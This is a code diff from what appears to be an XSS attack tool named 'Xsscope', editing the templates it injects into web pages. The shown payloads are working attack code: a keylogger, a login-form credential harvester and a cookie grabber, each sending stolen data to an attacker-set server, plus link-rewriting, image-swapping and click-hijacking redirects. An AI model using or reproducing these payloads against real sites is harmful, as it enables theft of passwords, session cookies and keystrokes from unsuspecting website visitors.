@@ -126,59 +126,47 @@ http://canyouseeme.org
         root1.update_idletasks()
 
         html_file = []
-        keylogger_code = """<script>
-document.onkeypress = function KeyLogger(inp){
+        keylogger_code = """document.onkeypress = function KeyLogger(inp){
   key_pressed = String.fromCharCode(inp.which);
   new Image().src = http://""" + tcp_server + """/retriever.php?xsscope="+key_pressed;
 }
-</script>
 
 """
 
-        xhr_harverster_code = '''<script>
-username = document.forms[0].elements[0].value;
+        xhr_harverster_code = '''username = document.forms[0].elements[0].value;
 password = document.forms[0].elements[1].value;
 window.setTimeout(function(){ 
 var req = new XMLHttpRequest();
-req.open("GET", "http://''' + tcp_server + '''/?username="+username+"&password="+password, true);
+req.open("GET", "http://''' + tcp_server + '''/auth_retriever.php?username="+username+"&password="+password, true);
 req.send();
 } , 10000);
-</script>
 
 '''
 
-        cookie_grabber_code = '''<script>
-function InterceptForm() {
+        cookie_grabber_code = '''function InterceptForm() {
 new Image().src = "http://''' + tcp_server + '''/cookie_grabber.php?sessionID="+document.cookie;
 }       
 window.addEventListener("load", InterceptForm());
-</script>
 
 '''
 
-        changelinks_code = '''<script>
-	var links = document.getElementsByTagName("a");
+        changelinks_code = '''var links = document.getElementsByTagName("a");
 	for (i=0; i<links.length; i++)
 	{
 		links[i].href = "''' + str(changelinks_entry.get()) + '''";
 		links[i].innerHTML = "Links Modified by Xsscope";
 	}
-</script>
 
 '''
 
-        changeimage_code = '''<script>
-document.getElementsByTagName("img")[0].src = "''' + str(image_URL_loader.get()) + '''";
-</script>
+        changeimage_code = '''document.getElementsByTagName("img")[0].src = "''' + str(image_URL_loader.get()) + '''";
 
 '''
 
-        clickjacker_code = '''<script>
-    function catchClick () {
-        location.href = "''' + str(URL_redirection.get()) + '''";
-    }   
-    document.body.addEventListener('click', catchClick, true);
-</script>
+        clickjacker_code = '''function catchClick () {
+    location.href = "''' + str(URL_redirection.get()) + '''";
+}   
+document.body.addEventListener('click', catchClick, true);
 
 '''
 
